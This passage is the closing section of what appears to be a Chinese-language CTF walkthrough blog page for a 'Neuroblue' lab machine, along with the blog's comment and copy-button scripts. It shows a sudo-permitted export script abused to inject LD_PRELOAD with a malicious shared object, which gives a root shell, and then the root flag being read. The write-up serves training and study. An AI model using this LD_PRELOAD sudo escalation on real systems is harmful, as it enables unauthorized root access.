+执行 <code class="notranslate">sudo /opt/export</code> 命令，并传递精心构造的参数。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">welcome@Neuroblue:/tmp$ sudo /opt/export LD_PRELOAD /tmp/exp.so <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span><span class="pl-pds">"</span></span>
+<span class="pl-c"><span class="pl-c">#</span> 此处脚本内部执行 export LD_PRELOAD=/tmp/exp.so</span>
+<span class="pl-c"><span class="pl-c">#</span> 然后执行 /usr/local/sbin/VMBreaker</span>
+<span class="pl-c"><span class="pl-c">#</span> VMBreaker 加载时，动态链接器发现 LD_PRELOAD，加载 exp.so</span>
+<span class="pl-c"><span class="pl-c">#</span> exp.so 的构造函数被执行...</span>
+root@Neuroblue:/tmp# </pre></div>
+</li>
+</ol>
+<h3>4.6. 获取 Root 权限 (Gaining Root Access)</h3>
+<p>成功执行上述 <code class="notranslate">sudo</code> 命令后，<code class="notranslate">/tmp/exp.so</code> 中的构造函数被触发，我们直接获得了一个 root 权限的 shell。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Neuroblue:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Neuroblue:/tmp# whoami
+root</pre></div>
+<p>成功获取 root 权限。</p>
+<ul>
+<li>
+<p><strong>获取 Root Flag:</strong> 读取 <code class="notranslate">/root/root.txt</code> 文件。</p>
+<div class="highlight highlight-source-shell"><pre class="notranslate">root@Neuroblue:/tmp# cat /root/root.txt 
+flag{root-3960a29b415a278c2d88bb0543c5f283}</pre></div>
+</li>
+</ul>
+<p><strong>注记：</strong> 在本报告的撰写过程中，AI 语言模型为部分章节的文本组织、概念阐述及语言优化提供了辅助支持。</p></div>
+<div style="font-size:small;margin-top:8px;float:right;"></div>
+
+<button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
+<div class="comments" id="comments"></div>
+
+</div>
+    <div id="footer"><div id="footer1">Copyright © <span id="copyrightYear"></span> <a href="https://7r1UMPH.github.io">Triumph Blog</a></div>
+<div id="footer2">
+    <span id="runday"></span><span>Powered by <a href="https://meekdai.com/Gmeek.html" target="_blank">Gmeek</a></span>
+</div>
+
+<script>
+var now=new Date();
+document.getElementById("copyrightYear").innerHTML=now.getFullYear();
+
+if(""!=""){
+    var startSite=new Date("");
+    var diff=now.getTime()-startSite.getTime();
+    var diffDay=Math.floor(diff/(1000*60*60*24));
+    document.getElementById("runday").innerHTML="网站运行"+diffDay+"天"+" • ";
+}
+</script></div>
+</body>
+<script>
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var utterancesLoad=0;
+
+console.log("\n %c Gmeek last https://github.com/Meekdai/Gmeek \n","padding:5px 0;background:#02d81d;color:#fff");
+</script>
+
+<script>
+document.getElementById("pathHome").setAttribute("d",IconList["home"]);
+document.getElementById("pathIssue").setAttribute("d",IconList["github"]);
+
+
+
+function openComments(){
+    cm=document.getElementById("comments");
+    cmButton=document.getElementById("cmButton");
+    cmButton.innerHTML="loading";
+    span=document.createElement("span");
+    span.setAttribute("class","AnimatedEllipsis");
+    cmButton.appendChild(span);
+
+    script=document.createElement("script");
+    script.setAttribute("src","https://utteranc.es/client.js");
+    script.setAttribute("repo","7r1UMPH/7r1UMPH.github.io");
+    script.setAttribute("issue-term","title");
+    
+    script.setAttribute("theme","github-light");
+    
+    script.setAttribute("crossorigin","anonymous");
+    script.setAttribute("async","");
+    cm.appendChild(script);
+
+    int=self.setInterval("iFrameLoading()",200);
+}
+
+function iFrameLoading(){
+    var utterances=document.getElementsByClassName('utterances');
+    if(utterances.length==1){
+        if(utterances[0].style.height!=""){
+            utterancesLoad=1;
+            int=window.clearInterval(int);
+            document.getElementById("cmButton").style.display="none";
+            console.log("utterances Load OK");
+        }
+    }
+}
+
+document.addEventListener('DOMContentLoaded', () => {
+    const createClipboardHTML = (codeContent, additionalClasses = '') => `
+        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
+        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
+            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
+                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
+                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
+            </clipboard-copy>
+            <div class="copy-feedback">Copied!</div>
+        </div>
+    `;
+
+    const handleCodeElements = (selector = '') => {
+        document.querySelectorAll(selector).forEach(codeElement => {
+            const codeContent = codeElement.innerHTML;
+            const newStructure = document.createElement('div');
+            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
+            newStructure.innerHTML = createClipboardHTML(codeContent);
+
+            const parentElement = codeElement.parentElement;
+            if (selector.includes('highlight')) {
+                parentElement.insertBefore(newStructure, codeElement.nextSibling);
+                parentElement.removeChild(codeElement);
+            } else {
+                parentElement.parentElement.replaceChild(newStructure, parentElement);
+            }
+        });
+    };
+
+    handleCodeElements('pre.notranslate > code.notranslate');
+    handleCodeElements('div.highlight > pre.notranslate');
+
+    let currentFeedback = null;
+    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
+        copyButton.addEventListener('click', () => {
+            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
+            const tempTextArea = document.createElement('textarea');
+            tempTextArea.value = codeContent;
+            document.body.appendChild(tempTextArea);
+            tempTextArea.select();
+            document.execCommand('copy');
+            document.body.removeChild(tempTextArea);
+
+            const copyIcon = copyButton.querySelector('.octicon-copy');
+            const checkIcon = copyButton.querySelector('.octicon-check');
+            const copyFeedback = copyButton.nextElementSibling;
+
+            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
+            currentFeedback = copyFeedback;
+
+            copyIcon.classList.add('d-none');
+            checkIcon.classList.remove('d-none');
+            copyFeedback.style.display = 'block';
+            copyButton.style.borderColor = 'var(--color-success-fg)';
+
+            setTimeout(() => {
+                copyIcon.classList.remove('d-none');
+                checkIcon.classList.add('d-none');
+                copyFeedback.style.display = 'none';
+                copyButton.style.borderColor = '';
+            }, 2000);
+        });
+    });
+});
+
+</script>
+</script><script src='https://7r1UMPH.github.io/plugins/TOC.js'></script><script src='https://blog.meekdai.com/Gmeek/plugins/lightbox.js'></script><script src='https://7r1UMPH.github.io/plugins/LazyLoadImages.js'></script>
+
+</html>
